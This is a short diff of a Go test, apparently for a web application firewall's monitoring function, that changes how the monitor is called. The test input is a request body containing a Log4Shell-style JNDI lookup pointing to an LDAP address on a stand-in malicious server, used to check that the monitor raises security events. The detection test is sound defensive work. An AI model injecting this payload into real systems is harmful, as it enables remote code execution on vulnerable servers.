@@ -67,6 +67,6 @@ func TestMonitor(t *testing.T) {
 		},
 		"server.request.body": "eyJ0ZXN0I${jndi:ldap://16.0.2.staging.malicious.server/a}joiYm9keSJ9",
 	}
-	events := asm.Monitor(addresses)
+	events := asm.Monitor(waf.RunAddressData{Persistent: addresses})
 	require.NotNil(t, events)
 }
